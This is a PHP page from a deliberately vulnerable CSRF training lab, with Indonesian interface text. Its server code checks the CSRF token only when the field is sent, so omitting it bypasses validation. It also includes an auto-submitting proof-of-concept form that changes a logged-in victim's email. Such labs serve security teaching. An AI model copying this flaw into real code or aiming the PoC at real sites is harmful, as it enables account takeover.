<?php
$title = 'Lab 3: Validasi token bisa dilewati dengan menghapus parameternya';
require_once __DIR__ . '/lib.php';
$db = load_db();
$msg = '';
$error = '';

if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(16));
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // VULNERABLE: validation is only performed if the csrf_token parameter
    // is present at all. Properly tied to the session this time (unlike
    // Lab 2) - but omitting the field entirely skips the check completely.
    $valid = true;
    if (isset($_POST['csrf_token'])) {
        $valid = hash_equals($_SESSION['csrf_token'], $_POST['csrf_token']);
    }
    if ($valid) {
        $db['user']['email'] = $_POST['email'] ?? $db['user']['email'];
        save_db($db);
        $db = load_db();
        $msg = 'Email berhasil diubah menjadi ' . htmlspecialchars($db['user']['email']);
    } else {
        $error = 'Token CSRF tidak valid.';
    }
}

include 'header.php';
if (!is_logged_in()) { echo '<div class="error-box">Login dulu sebagai victim, lalu buka lab ini lagi.</div>'; include 'footer.php'; exit; }

$poc = <<<HTML
<html>
<body onload="document.forms[0].submit()">
<form action="http://localhost:8079/csrf/lab3_token_removal.php" method="POST">
  <input type="hidden" name="email" value="attacker-owns-this@evil.test">
  <!-- Sengaja TIDAK menyertakan field csrf_token sama sekali -->
</form>
</body>
</html>
HTML;
?>

<details class="hint-box">
<summary>Lihat Hint</summary>
<p class="hint">Goal: kali ini token benar-benar diikat ke session dengan
<code>hash_equals()</code> yang aman &mdash; kalau kamu kirim token yang salah, request ditolak.
Tapi validasinya dibungkus <code>if (isset($_POST['csrf_token']))</code>: kalau parameter itu
sama sekali <strong>tidak dikirim</strong>, validasi tidak pernah dijalankan dan request langsung
dianggap sah. PoC di bawah sengaja tidak menyertakan field <code>csrf_token</code> apa pun.</p>
</details>

<p>Email saat ini: <strong><?php echo htmlspecialchars($db['user']['email']); ?></strong></p>
<?php if ($msg): ?><div class="ok-box"><?php echo $msg; ?></div><?php endif; ?>
<?php if ($error): ?><div class="error-box"><?php echo htmlspecialchars($error); ?></div><?php endif; ?>

<h3>Form ubah email (legit)</h3>
<form method="post">
  <input type="text" name="email" value="<?php echo htmlspecialchars($db['user']['email']); ?>">
  <input type="hidden" name="csrf_token" value="<?php echo htmlspecialchars($_SESSION['csrf_token']); ?>">
  <button type="submit">Update Email</button>
</form>

<h3>PoC HTML (halaman attacker, tanpa field csrf_token)</h3>
<textarea readonly rows="8" style="width:100%;font-family:monospace;"><?php echo htmlspecialchars($poc); ?></textarea>

<?php include 'footer.php'; ?>
